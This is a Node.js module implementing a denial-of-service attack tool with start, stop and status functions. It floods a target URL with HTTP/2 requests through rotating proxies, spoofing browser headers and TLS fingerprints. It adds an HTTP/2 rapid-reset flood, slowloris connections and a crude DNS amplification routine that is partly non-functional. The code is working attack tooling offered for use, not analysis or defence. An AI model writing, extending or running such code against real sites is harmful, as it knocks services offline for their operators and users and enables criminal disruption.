const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const dgram = require("dgram");
const http = require("http");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

var proxyFile = "proxy.txt";
var proxies = readLines(proxyFile);
var userAgents = readLines("ua.txt");
var refList = readLines("ref.txt");

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true)

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

var running = {};

function runFlooder(parsedTarget, rate, onLog) {
    const proxies = readLines(proxyFile);
    const userAgents = readLines("ua.txt");
    const refList = readLines("ref.txt");
    const headers = {};

    headers[":method"] = "GET";
    headers[":path"] = parsedTarget.path;
    headers["referer"] = randomElement(refList);
    headers[":scheme"] = "https";
    headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
    headers["accept-language"] = "es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3";
    headers["accept-encoding"] = "gzip, deflate, br";
    headers["x-forwarded-proto"] = "https";
    headers["cache-control"] = "no-cache, no-store,private, max-age=0, must-revalidate";
    headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
    headers["sec-ch-ua-platform"] = randomElement(["Android", "iOS", "Linux", "macOS", "Windows"]);
    headers["sec-fetch-dest"] = "document";
    headers["sec-fetch-mode"] = "navigate";
    headers["sec-fetch-site"] = "same-origin";
    headers["upgrade-insecure-requests"] = "1";

    function doRun() {
        if (!running[parsedTarget.host]) return;

        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");

        headers[":authority"] = parsedTarget.host;
        headers[":path"] = parsedTarget.path;
        headers["user-agent"] = randomElement(userAgents);
        headers["x-forwarded-for"] = parsedProxy[0];
        headers["referer"] = randomElement(refList);

        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 15
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error || !running[parsedTarget.host]) return;

            connection.setKeepAlive(true, 60000);
            connection.setNoDelay(true);

            const settings = {
                enablePush: false,
                initialWindowSize: 1073741823
            };

            const tlsOptions = {
                port: 443,
                secure: true,
                ALPNProtocols: ["h2"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
                socket: connection,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: false,
                host: parsedTarget.host,
                rejectUnauthorized: false,
                clientCertEngine: "dynamic",
                secureOptions: secureOptions,
                secureContext: secureContext,
                servername: parsedTarget.host,
                secureProtocol: secureProtocol
            };

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60 * 1000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: settings,
                maxSessionMemory: 3333,
                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => tlsConn
            });

            client.setMaxListeners(0);
            client.settings(settings);

            client.on("connect", () => {
                if (!running[parsedTarget.host]) {
                    client.destroy();
                    connection.destroy();
                    return;
                }
                const IntervalAttack = setInterval(() => {
                    if (!running[parsedTarget.host]) {
                        clearInterval(IntervalAttack);
                        client.destroy();
                        connection.destroy();
                        return;
                    }
                    for (let i = 0; i < rate; i++) {
                        headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                        const request = client.request(headers)
                            .on("response", response => {
                                request.close();
                                request.destroy();
                            });
                        request.end();
                    }
                }, 1000);
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
            });

            client.on("error", () => {
                client.destroy();
                connection.destroy();
            });
        });
    }

    for (let i = 0; i < 10; i++) {
        setInterval(doRun, 0);
    }
}

function amplificationAttack(parsedTarget) {
    if (!running[parsedTarget.host]) return;
    const dnsServers = ['8.8.8.8', '8.8.4.4', '1.1.1.1'];
    const targetIp = parsedTarget.hostname;

    dnsServers.forEach(server => {
        if (!running[parsedTarget.host]) return;
        const message = Buffer.from('ANY ' + targetIp);
        const client = dgram.createSocket('udp4');
        client.send(message, 0, message.length, 53, server, (err) => {
            client.close();
        });
    });
}

function slowlorisAttack(parsedTarget) {
    if (!running[parsedTarget.host]) return;
    const options = {
        host: parsedTarget.hostname,
        port: 80,
        path: parsedTarget.path,
        method: 'GET',
        headers: {
            'User-Agent': randomElement(userAgents),
            'Connection': 'Keep-Alive'
        }
    };

    const req = http.request(options, (res) => {
        res.on('data', () => {});
    });

    req.on('error', () => {});
    req.end();
}

function http2RapidResetAttack(parsedTarget, rate) {
    if (!running[parsedTarget.host]) return;

    const proxies = readLines(proxyFile);
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !running[parsedTarget.host]) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                if (!running[parsedTarget.host]) {
                    clearInterval(IntervalAttack);
                    client.destroy();
                    connection.destroy();
                    return;
                }
                for (let i = 0; i < rate; i++) {
                    const headers = {
                        [":method"]: "GET",
                        [":authority"]: parsedTarget.host,
                        [":path"]: parsedTarget.path,
                        [":scheme"]: "https",
                        "referer": "https://" + parsedTarget.host + parsedTarget.path,
                        "user-agent": randomElement(userAgents)
                    };
                    const request = client.request(headers)
                        .on("response", () => {
                            request.close();
                            request.destroy();
                        });
                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

function startAttack(targetUrl, time, rate, threads) {
    if (running[targetUrl]) return { error: "Attack already running on this target" };

    const parsedTarget = url.parse(targetUrl);
    if (!parsedTarget.host) return { error: "Invalid URL" };

    running[parsedTarget.host] = {
        target: targetUrl,
        startTime: Date.now(),
        duration: time * 1000
    };

    for (let counter = 1; counter <= threads; counter++) {
        runFlooder(parsedTarget, rate);
    }

    const ampInterval = setInterval(() => amplificationAttack(parsedTarget), 100);
    const slowInterval = setInterval(() => slowlorisAttack(parsedTarget), 200);
    const resetInterval = setInterval(() => http2RapidResetAttack(parsedTarget, rate), 500);

    running[parsedTarget.host].intervals = [ampInterval, slowInterval, resetInterval];

    running[parsedTarget.host].timer = setTimeout(() => {
        stopAttack(targetUrl);
    }, time * 1000);

    return { success: true, target: targetUrl, duration: time, rate: rate, threads: threads };
}

function stopAttack(targetUrl) {
    const parsedTarget = url.parse(targetUrl);
    const host = parsedTarget.host;
    if (!host || !running[host]) return { error: "No attack running on this target" };

    clearTimeout(running[host].timer);
    if (running[host].intervals) {
        running[host].intervals.forEach(i => clearInterval(i));
    }
    delete running[host];
    return { success: true, target: targetUrl };
}

function stopAll() {
    const hosts = Object.keys(running);
    hosts.forEach(host => {
        clearTimeout(running[host].timer);
        if (running[host].intervals) {
            running[host].intervals.forEach(i => clearInterval(i));
        }
        delete running[host];
    });
    return { success: true, stopped: hosts.length };
}

function getStatus() {
    const attacks = Object.keys(running).map(host => ({
        target: running[host].target,
        elapsed: Math.floor((Date.now() - running[host].startTime) / 1000),
        duration: running[host].duration / 1000
    }));
    return attacks;
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

module.exports = { startAttack, stopAttack, stopAll, getStatus };